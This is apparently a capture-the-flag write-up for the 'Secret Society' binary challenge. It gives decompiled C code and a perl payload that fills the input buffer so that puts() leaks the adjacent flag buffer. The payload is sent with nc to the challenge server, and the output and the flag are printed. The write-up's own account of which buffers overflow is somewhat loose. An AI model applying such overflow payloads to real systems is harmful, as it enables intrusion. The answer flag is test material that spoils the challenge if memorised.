## Secret Society
The main idea finding the flag is Buffer Overflow.

#### Step-1:
After I downloaded `secret-society`, I reversed it with IDA, I got this source code:

**main()** function:
```c
undefined8 main(void)
{
  size_t sVar1;
  undefined8 local_d8 [2];
  undefined4 uStack200;
  undefined auStack196 [108];
  char local_58 [56];
  FILE *local_20;
  char *local_18;
  __gid_t local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  local_c = getegid();
  setresgid(local_c,local_c,local_c);
  memset(local_58,0,0x32);
  memset(local_d8,0,0x80);
  puts("What is the secret phrase?");
  fgets((char *)local_d8,0x80,stdin);
  local_18 = strchr((char *)local_d8,10);
  if (local_18 != (char *)0x0) {
    *local_18 = '\0';
  }
  sVar1 = strlen((char *)local_d8);
  *(undefined8 *)((long)local_d8 + sVar1) = 0x657261206577202c;
  *(undefined8 *)((long)local_d8 + sVar1 + 8) = 0x6877797265766520;
  *(undefined4 *)((long)&uStack200 + sVar1) = 0x2e657265;
  auStack196[sVar1] = 0;
  local_20 = fopen("flag.txt","r");
  if (local_20 == (FILE *)0x0) {
    printf("You are a double agent, it\'s game over for you.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_58,0x32,local_20);
  printf("Shhh... don\'t tell anyone else about ");
  puts((char *)local_d8);
  return 0;
}

```

#### Step-2:
So, basically I had to overflow 3 buffers in above code `local_d8 (16 bytes, our input buffer)`, `uStack200 (4 bytes)` & `auStack196 (108 bytes)`

So I tried using Debugger to get the address of the flag.


```bash
echo flag > flag.txt
perl -e 'print "A"x16 . "B"x4 . "C"x108' | ./secret-society
```

I got this output: 

```bash
What is the secret phrase?
Shhh... don't tell anyone else about AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,flag
```

#### Step-3:
So, we just have to run this remotely on the web server.

```bash
perl -e 'print "A"x16 . "B"x4 . "C"x108' | nc chall.csivit.com 30041
```
I got this output: 

```bash
What is the secret phrase?
Shhh... don't tell anyone else about AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,csivit{Bu!!er_e3pl01ts_ar5_5asy}
```
Voila! I got the flag there.

#### Step-4:
Finally the flag becomes:
`csivit{Bu!!er_e3pl01ts_ar5_5asy}`
